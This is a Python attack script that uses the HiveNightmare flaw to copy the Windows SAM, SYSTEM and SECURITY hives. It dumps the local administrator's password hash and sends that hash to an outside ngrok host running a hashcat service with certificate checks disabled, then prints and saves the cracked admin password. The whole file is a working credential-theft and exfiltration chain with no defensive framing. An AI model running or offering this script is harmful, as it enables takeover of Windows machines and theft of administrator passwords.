import time
import os
import requests
import urllib3
urllib3.disable_warnings()
date = "2021-07-15"
samF = ("SAM-"+date)
systemF = ("SYSTEM-"+date)
securityF = ("SECURITY-"+date)
AppData = (os.getenv('APPDATA') + '\\test')
os.system("mkdir "+AppData)

# -- TODO
# Code should come here to automatically download hivenightmare and the hashdumper into the AppData folder
# -- TODO

print("[+] Please wait a moment!")
os.system(str(AppData)+"\\nightmare.exe"+" >nul 2>&1")
time.sleep(2)
os.system("move "+samF+" "+ str(AppData)+" >nul 2>&1")
os.system("move "+systemF+" "+ str(AppData)+" >nul 2>&1")
os.system("move "+securityF+" "+ str(AppData)+" >nul 2>&1")
os.system(""+str(AppData)+"\dump.exe -sam "+ str(AppData) + "\\"+samF+" -system "+ str(AppData) + "\\"+systemF+" -security " + str(AppData) + "\\"+securityF+" LOCAL > "+AppData+"\\output.txt")
f=open(AppData+'\\output.txt')
lines=f.readlines()
adminhash = lines[5]
array = adminhash.split(":")
username = array[0]
password = array[3]
f.close()
os.system("del "+AppData+"\\output.txt")
# -quiet
response = requests.get("https://HOST.ngrok.io/hashcat.php?hash="+password+"&wordlist=wordlist/ASLM(freq_sorted).txt&rule=rules/test.rule", verify=False)
r = response.text
time.sleep(7)
secondarray = r.split(":")
cracked = secondarray[2]
print("\n"+str("[+] admin password: " + cracked))
os.system("echo "+cracked+" > "+username+".txt")
print("[+] Results saved into TXT file"+"\n")
os.system("pause")
